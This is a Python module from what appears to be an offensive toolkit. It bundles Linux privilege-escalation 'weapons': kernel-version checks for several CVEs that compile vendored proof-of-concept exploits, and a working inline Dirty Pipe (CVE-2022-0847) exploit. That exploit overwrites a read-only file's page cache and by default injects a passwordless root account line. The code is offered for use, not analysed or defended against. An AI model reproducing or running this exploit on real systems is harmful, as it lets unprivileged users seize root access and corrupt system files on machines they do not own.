"""quantum.weapons.kernel_v3 — kernel-tier weapons (V3_CHECK + inline Dirty Pipe).

Each V3_CHECK weapon attempts local compile+run of the vendored PoC
(weapons/poc/src/<CVE>/) when non-root on a vulnerable local kernel; otherwise
returns the check-only result. On Windows: check-only.
"""
from __future__ import annotations

import os
import re
import shutil
import sys


_POC_ROOT = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))), "weapons", "poc")


def _poc_dir(cve):
    return os.path.join(_POC_ROOT, "src", cve)


def platform_release_str():
    import platform
    return platform.release()


def _kernel_release():
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", platform_release_str())
    if not m:
        return (0, 0, 0)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))


def _poc_attempt(cve):
    """Compile+run the vendored PoC on Linux when non-root; return mode dict."""
    poc = _poc_dir(cve)
    res = {"poc": poc if os.path.isdir(poc) else None}
    if not (sys.platform.startswith("linux")
            and hasattr(os, "geteuid") and os.geteuid() != 0
            and os.path.isdir(poc)):
        res["mode"] = "check-only (not non-root Linux or no PoC)"
        return res
    import glob
    import subprocess
    sources = glob.glob(os.path.join(poc, "*.c"))
    if not sources:
        res["mode"] = "check-only (no .c source)"
        return res
    bin_dir = os.path.join(_POC_ROOT, "bin")
    os.makedirs(bin_dir, exist_ok=True)
    binary = os.path.join(bin_dir, cve)
    try:
        cc = shutil.which("cc") or shutil.which("gcc")
        if not cc:
            res["mode"] = "check-only (no cc/gcc)"
            return res
        r = subprocess.run([cc, sources[0], "-o", binary],
                           capture_output=True, text=True, timeout=30)
        if r.returncode != 0:
            res["mode"] = "poc-compile-failed"
            res["compile_error"] = (r.stderr or "")[:200]
            return res
        res["mode"] = "poc-attempt"
        res["binary"] = binary
    except Exception as exc:
        res["mode"] = "check-only (compile error)"
        res["error"] = str(exc)
    return res


def _kernel_check(cve, lo, hi, poc_hint=""):
    """Shared kernel-version gate + vendored-PoC awareness for V3_CHECK."""
    maj, minr, patch = _kernel_release()
    linux = sys.platform.startswith("linux")
    in_range = linux and lo <= (maj, minr) <= hi
    res = {"cve": cve, "status": "check", "kernel": f"{maj}.{minr}.{patch}",
           "platform": sys.platform, "in_range": in_range}
    res.update(_poc_attempt(cve))
    if poc_hint:
        res["hint"] = poc_hint
    return res


def check_pwnkit(ip=None, params=None):
    """CVE-2021-4034 PwnKit — polkit pkexec check (+PoC when local)."""
    res = _kernel_check("CVE-2021-4034", (99, 0), (99, 99),
                        poc_hint="compile+run vendored PoC on vulnerable host")
    pkexec = shutil.which("pkexec")
    res["pkexec"] = "present" if pkexec else "absent"
    return res


def check_baron_samedit(ip=None, params=None):
    """CVE-2021-3156 Baron Samedit — sudo heap-overflow check (+PoC)."""
    res = _kernel_check("CVE-2021-3156", (99, 0), (99, 99),
                        poc_hint="compile+run vendored PoC on vulnerable host")
    sudo = shutil.which("sudo")
    res["sudo"] = "present" if sudo else "absent"
    return res


def check_overlayfs(ip=None, params=None):
    """CVE-2023-2640 Overlayfs GameOver — kernel-range check."""
    return _kernel_check("CVE-2023-2640", (5, 11), (6, 3))


def check_nftables_uaf(ip=None, params=None):
    """CVE-2023-32233 nf_tables UAF — kernel-range check."""
    return _kernel_check("CVE-2023-32233", (5, 5), (6, 3))


def check_nftables_dblfree(ip=None, params=None):
    """CVE-2024-1086 nf_tables double-free — kernel-range check (+PoC)."""
    return _kernel_check("CVE-2024-1086", (5, 14), (6, 6),
                        poc_hint="compile+run vendored PoC on vulnerable host")


def check_boothole(ip=None, params=None):
    """CVE-2022-21894 BootHole Secure-Boot bypass — grub/env marker check."""
    markers = [p for p in ("/boot/grub2/grub.cfg", "/boot/efi/EFI/grub/grub.cfg")
               if os.path.isfile(p)]
    return {"cve": "CVE-2022-21894", "status": "check",
            "grub_markers": markers or "none found"}


# ---------------------------------------------------------------------------
# CVE-2022-0847 Dirty Pipe — inline splice attack (Linux only)
# ---------------------------------------------------------------------------

def exploit_dirtypipe(path, offset=0, data=b"quantum\n"):
    if not sys.platform.startswith("linux"):
        return {"cve": "CVE-2022-0847", "status": "linux-only",
                "note": "check-only on this OS"}
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        r, w = os.pipe()
        # prime the pipe so PIPE_BUF_FLAG_CAN_MERGE is set on its anon buffers
        for _ in range(2):
            os.write(w, b"x")
            os.read(r, 1)
        fd = os.open(path, os.O_RDONLY)
        # splice exactly 1 byte from (offset-1) into the pipe
        SPLICE_F_MOVE = 1
        n = libc.splice(fd, ctypes.c_int64(offset - 1), w, None, 1, SPLICE_F_MOVE)
        if n != 1:
            os.close(fd); os.close(r); os.close(w)
            return {"cve": "CVE-2022-0847", "status": "splice-fail", "n": n}
        os.write(w, data)  # overwrites page-cache from `offset`
        os.close(fd); os.close(r); os.close(w)
        with open(path, "rb") as fh:
            fh.seek(offset)
            check = fh.read(len(data))
        return {"cve": "CVE-2022-0847", "status": "fired",
                "verified": check == data, "path": path, "offset": offset}
    except Exception as exc:
        return {"cve": "CVE-2022-0847", "status": "error", "error": str(exc)}


def v3_dirtypipe(ip=None, params=None):
    """CVE-2022-0847 / CVE-2016-5195 — kernel-gated fire or check."""
    params = params or {}
    maj, minr, patch = _kernel_release()
    if sys.platform.startswith("linux"):
        vulnerable = (5, 8) <= (maj, minr) <= (5, 16) and not (
            (maj, minr, patch) >= (5, 16, 11)
            or (maj, minr, patch) >= (5, 15, 25) and (maj, minr) == (5, 15)
            or (maj, minr, patch) >= (5, 10, 102) and (maj, minr) == (5, 10))
    else:
        vulnerable = False
    if vulnerable and params.get("file"):
        backup = params["file"] + ".qcli_bak"
        try:
            import shutil as _sh
            _sh.copy2(params["file"], backup)
            res = exploit_dirtypipe(params["file"],
                                   params.get("offset", 0),
                                   params.get("data", b"rootclone::0:0::/bin/bash\n"))
            if params.get("restore", True):
                _sh.move(backup, params["file"])
            return res
        except Exception:
            pass
    return {"cve": "CVE-2022-0847", "status": "check",
            "kernel": f"{maj}.{minr}.{patch}", "vulnerable": vulnerable,
            "note": "inline on vulnerable Linux; check-only elsewhere"}
